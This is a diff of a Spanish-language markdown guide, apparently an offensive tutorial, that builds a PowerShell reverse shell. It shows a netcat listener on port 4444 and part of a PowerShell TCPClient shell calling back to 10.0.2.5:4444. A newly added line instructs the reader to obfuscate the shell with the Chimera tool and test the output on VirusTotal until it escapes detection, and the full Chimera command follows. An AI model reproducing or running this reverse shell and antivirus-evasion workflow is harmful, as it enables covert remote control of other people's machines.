@@ -189,7 +189,7 @@ Y posteriormente levantar nuestra Reverse Shell:
 nc -nlvp 4444
  ```
  
-<details><summary>Reverse Shell en PowerShell sin ofuscar</summary>
+<details><summary>Nuestra Reverse Shell en PowerShell sin ofuscar</summary>
 <p>
  
 ```PowerShell
@@ -198,6 +198,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 </p>
 </details>
 
+Para ofuscarlo debemos ejectar el siguinete comando e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload). 
 ```bash
 /opt/chimera.sh -f /opt/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
  ```
